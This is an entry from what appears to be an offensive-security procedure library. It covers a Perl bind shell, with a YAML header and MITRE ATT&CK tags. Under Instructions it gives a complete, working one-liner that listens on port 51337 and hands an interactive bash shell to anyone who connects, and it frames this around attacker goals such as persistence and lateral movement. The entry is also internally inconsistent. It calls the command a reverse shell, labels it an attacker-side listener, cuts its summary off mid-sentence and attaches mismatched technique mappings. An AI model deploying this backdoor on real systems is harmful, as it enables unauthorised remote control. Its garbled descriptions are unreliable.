---
id: 9d5003cf-bd1a-4ce5-8361-5f31e8d835b2
name: Perl Bind Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.751750+00:00'
updated_at: '2023-04-10T20:21:16.630708+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Data Encrypted|T1022 - Data Encrypted]]'
- '[[Service Execution|T1035 - Service Execution]]'
tags:
- '[[Bind Shell]]'
- '[[Perl]]'
commands:
- '[[Open a listener on attacker machine]]'
---

# Perl Bind Shell

## Summary

A Perl bind shell is a type of shell that allows an attacker to remotely control a compromised system. Perl is a popular language for creating bind shells due to its flexibility and ease of use. When a Perl bind shell is executed on a target system, it opens a network port and waits for an incoming

## Description

# Description

A Perl bind shell is a type of shell that allows an attacker to remotely control a compromised system. Perl is a popular language for creating bind shells due to its flexibility and ease of use. When a Perl bind shell is executed on a target system, it opens a network port and waits for an incoming connection from the attacker. Once the connection is established, the attacker can execute commands on the target system as if they were sitting in front of it.

From an offensive perspective, a Perl bind shell can be used to gain persistent access to a compromised system. The attacker can use the bind shell to maintain access to the system even if other access methods are discovered and blocked. Additionally, a Perl bind shell can be used to move laterally within a network and escalate privileges on compromised systems.

From a technical perspective, a Perl bind shell is created by writing a Perl script that listens on a specific network port for incoming connections. When a connection is established, the script forks a new process to handle the connection and redirects input and output to the network socket. The script can be encrypted to obfuscate its purpose and evade detection by security software.

From a business perspective, a Perl bind shell can be used by attackers to steal sensitive data, install malware, or disrupt business operations. Organizations can mitigate the risk of Perl bind shells by implementing network segmentation, monitoring network traffic for suspicious activity, and restricting access to critical systems.

## Requirements

1. Access to the target system

1. Ability to execute Perl scripts on the target system

1. Network access to the target system

## Defense

1. Implement network segmentation to limit the spread of a Perl bind shell

1. Monitor network traffic for suspicious activity, such as unusual network connections or data transfers

1. Restrict access to critical systems to limit the impact of a Perl bind shell

## Objectives

1. Gain persistent access to a compromised system

1. Move laterally within a network

1. Escalate privileges on compromised systems

# Instructions

1. This command creates a reverse shell using Perl programming language. It opens a socket and listens on port 51337 for incoming connections. Once a connection is established, it opens a bash shell on the remote machine with standard input, output and error redirected to the socket. This allows the attacker to execute commands on the remote machine and receive their output.

**Code**: [[perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK]]

> The command uses the Perl Socket module to create a TCP socket. The bind function binds the socket to port 51337 and INADDR_ANY address, which means it will listen on all network interfaces. The listen function sets the maximum number of queued connections to SOMAXCONN, which is a system-defined constant. The for loop waits for incoming connections and accepts them with the accept function. Once a connection is accepted, it opens three file descriptors for standard input, output and error, and redirects them to the socket using the dup2 function. Finally, it executes the /bin/bash shell using the exec function.

**Command** ([[Open a listener on attacker machine]]):

```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Data Encrypted|T1022 - Data Encrypted]]
- [[Service Execution|T1035 - Service Execution]]

## Commands Used

- [[Open a listener on attacker machine]]

## Tags

- [[Bind Shell]]
- [[Perl]]
